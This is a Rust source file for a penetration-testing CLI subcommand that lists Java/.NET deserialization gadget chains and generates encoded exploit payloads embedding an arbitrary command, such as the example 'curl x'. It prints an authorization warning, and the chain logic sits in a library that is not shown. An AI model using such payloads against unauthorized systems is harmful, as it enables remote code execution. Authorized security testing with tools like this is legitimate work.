//! `lancer ysoserial` — §40 deserialization payload generator (ysoserial-equivalent).
//!
//! List known Java/.NET gadget chains, or generate an exploit payload for a
//! chain + command in a chosen encoding. Calls `lancer_deser` directly.
//!
//!   lancer ysoserial --list
//!   lancer ysoserial --chain CommonsCollections1 --cmd 'curl x' --encode base64

use anyhow::{bail, Result};
use clap::{Args, ValueEnum};
use lancer_deser::{Encoding, PayloadRequest};

#[derive(Debug, Args)]
pub struct YsoserialArgs {
    /// List all known gadget chains and exit.
    #[arg(long)]
    list: bool,

    /// Gadget chain name (e.g. CommonsCollections1, TypeConfuseDelegate).
    #[arg(long)]
    chain: Option<String>,

    /// Command to embed in the generated payload.
    #[arg(long)]
    cmd: Option<String>,

    /// Output encoding for the generated payload.
    #[arg(long, value_enum, default_value_t = Encode::Base64)]
    encode: Encode,

    /// Emit the GeneratedPayload as pretty JSON instead of plain text.
    #[arg(long)]
    json: bool,
}

#[derive(Debug, Clone, Copy, ValueEnum)]
enum Encode {
    Raw,
    Base64,
    Hex,
    Url,
    Form,
}

impl From<Encode> for Encoding {
    fn from(e: Encode) -> Self {
        match e {
            Encode::Raw => Encoding::Raw,
            Encode::Base64 => Encoding::Base64,
            Encode::Hex => Encoding::Hex,
            Encode::Url => Encoding::UrlEncoded,
            Encode::Form => Encoding::FormEncoded,
        }
    }
}

pub fn run(args: YsoserialArgs) -> Result<()> {
    if args.list {
        list_chains();
        return Ok(());
    }

    let Some(chain) = args.chain else {
        bail!("either --list or --chain <name> --cmd <command> is required");
    };
    let Some(cmd) = args.cmd else {
        bail!("--cmd <command> is required when generating a payload");
    };

    let req = PayloadRequest {
        chain,
        cmd,
        encoding: args.encode.into(),
    };

    let payload = match lancer_deser::generate(&req) {
        Ok(p) => p,
        Err(e) => bail!("{e}"),
    };

    if args.json {
        println!("{}", serde_json::to_string_pretty(&payload)?);
    } else {
        println!("chain:    {}", payload.chain);
        println!("platform: {:?}", payload.platform);
        println!("encoding: {:?}", payload.encoding);
        if payload.requires_authorization {
            println!("WARNING:  requires authorization — only use against systems you are authorized to test.");
        }
        println!("payload:");
        println!("{}", payload.payload);
    }

    Ok(())
}

fn list_chains() {
    let chains = lancer_deser::known_chains();
    println!("{} known gadget chains:", chains.len());
    for c in chains {
        println!("  [{:?}] {}", c.platform, c.name);
        println!("      {} ({})", c.description, c.library);
    }
}
